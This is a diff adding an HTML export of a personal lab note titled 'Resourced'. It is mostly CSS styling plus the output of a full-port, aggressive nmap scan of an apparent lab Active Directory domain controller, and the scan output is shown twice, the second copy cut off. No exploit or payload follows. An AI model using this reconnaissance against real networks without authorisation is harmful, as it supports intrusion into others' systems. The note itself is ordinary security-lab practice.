@@ -1,0 +1,1380 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Resourced</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Resourced</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="resourced">Resourced</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.131.175 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 17:17 EST
+Nmap scan report for 192.168.131.175
+Host is up (0.0078s latency).
+Not shown: 65513 filtered tcp ports (no-response), 1 filtered tcp ports (host-unreach)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-22 22:19:36Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: resourced
+|   NetBIOS_Domain_Name: resourced
+|   NetBIOS_Computer_Name: RESOURCEDC
+|   DNS_Domain_Name: resourced.local
+|   DNS_Computer_Name: ResourceDC.resourced.local
+|   DNS_Tree_Name: resourced.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-01-22T22:20:31+00:00
+| ssl-cert: Subject: commonName=ResourceDC.resourced.local
+| Not valid before: 2026-01-21T22:17:07
+|_Not valid after:  2026-07-23T22:17:07
+|_ssl-date: 2026-01-22T22:21:10+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49712/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-01-22T22:20:35
+|_  start_date: N/A
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT     ADDRESS
+1   8.28 ms 192.168.45.1
+2   5.73 ms 192.168.45.254
+3   8.75 ms 192.168.251.1
+4   8.80 ms 192.168.131.175
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 224.06 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.131.175 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 17:17 EST
+Nmap scan report for 192.168.131.175
+Host is up (0.0078s latency).
+Not shown: 65513 filtered tcp ports (no-response), 1 filtered tcp ports (host-unreach)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-22 22:19:36Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: resourced
+|   NetBIOS_Domain_Name: resourced
+|   NetBIOS_Computer_Name: RESOURCEDC
+|   DNS_Domain_Name: resourced.local
+|   DNS_Computer_Name: ResourceDC.resourced.local
+|   DNS_Tree_Name: resourced.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-01-22T22:20:31+00:00
+| ssl-cert: Subject: commonName=ResourceDC.resourced.local
+| Not valid before: 2026-01-21T22:17:07
+|_Not valid after:  2026-07-23T22:17:07
+|_ssl-date: 2026-01-22T22:21:10+00:00; 0s from scanner time.
